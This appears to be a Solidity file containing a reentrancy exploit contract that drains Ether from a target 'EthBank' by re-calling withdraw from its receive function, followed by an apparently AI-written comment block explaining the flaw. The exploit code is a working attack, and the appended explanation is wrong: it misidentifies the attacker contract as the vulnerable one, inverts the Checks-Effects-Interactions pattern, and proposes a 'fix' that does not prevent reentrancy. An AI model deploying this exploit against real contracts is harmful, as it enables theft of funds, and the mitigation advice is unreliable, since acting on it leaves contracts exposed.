// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

// Interface for the EthBank contract.
interface IEthBank {
    // Function to deposit Ether.
    function deposit() external payable;

    // Function to withdraw Ether.
    function withdraw() external payable;
}

// Exploit contract to interact with EthBank.
contract EthBankExploit {
    // Address of the EthBank contract.
    IEthBank public bank;
    
    // Counter variable (not used in the contract).
    uint count;

    // Constructor to set the EthBank contract address.
    constructor(IEthBank _bank) {
        bank = _bank;
    }
    
    // Fallback function to receive Ether.
    receive() external payable {
        // Check if the balance of the EthBank contract is greater than or equal to 1 Ether.
        if (address(bank).balance >= 1 ether) {
            // If the condition is met, call the withdraw function of the EthBank contract.
            bank.withdraw();
        }
    }

    // Function to perform the exploit.
    function pwn() external payable {
        // Deposit 1 Ether into the EthBank contract.
        bank.deposit{value: 1 ether}();
        
        // Call the withdraw function of the EthBank contract.
        bank.withdraw();
        
        // Transfer the remaining balance of this contract to the caller.
        payable(msg.sender).transfer(address(this).balance);
    }
}



/* Certainly, let me explain the reentrancy vulnerability within the code and suggest an update to mitigate the vulnerability.

**Reentrancy Vulnerability Explanation:**

The reentrancy vulnerability occurs when an external contract (in this case, the `IEthBank` contract) can call back into the `EthBankExploit` contract during the execution of the `withdraw` function. If the `withdraw` function is called by an external contract before updating the contract's state, it can re-enter the `pwn` function and potentially exploit it.

Here's the vulnerable part of the code:

```solidity
// Function to perform the exploit.
function pwn() external payable {
    // Deposit 1 Ether into the EthBank contract.
    bank.deposit{value: 1 ether}();
    
    // Call the withdraw function of the EthBank contract.
    bank.withdraw();
    
    // Transfer the remaining balance of this contract to the caller.
    payable(msg.sender).transfer(address(this).balance);
}
```

In this code, the `pwn` function deposits 1 Ether into the `EthBank` contract and then immediately calls the `withdraw` function of the `EthBank` contract. If the `withdraw` function allows an external contract to call back into the `EthBankExploit` contract before it completes, this can result in a reentrancy attack.

**Mitigation:**

To mitigate the reentrancy vulnerability, you can follow the "Checks-Effects-Interactions" pattern. Ensure that state changes are made after all external calls to prevent reentrancy attacks.

Here's an updated version of the `pwn` function with mitigation:

```solidity
// Function to perform the exploit.
function pwn() external payable {
    // Deposit 1 Ether into the EthBank contract.
    bank.deposit{value: 1 ether}();
    
    // Ensure that the deposit is successful and the balance is updated before proceeding.
    require(address(this).balance >= 1 ether, "Deposit failed");

    // Call the withdraw function of the EthBank contract.
    bank.withdraw();
    
    // Transfer the remaining balance of this contract to the caller.
    payable(msg.sender).transfer(address(this).balance);
}
```

In this updated version, a `require` statement is added to ensure that the deposit is successful and the balance of the `EthBankExploit` contract is updated before proceeding to call the `withdraw` function. This change follows the "Checks-Effects-Interactions" pattern and reduces the risk of reentrancy attacks.

Please note that ensuring the `IEthBank` contract is secure and does not allow reentrancy is also crucial for overall security.

*/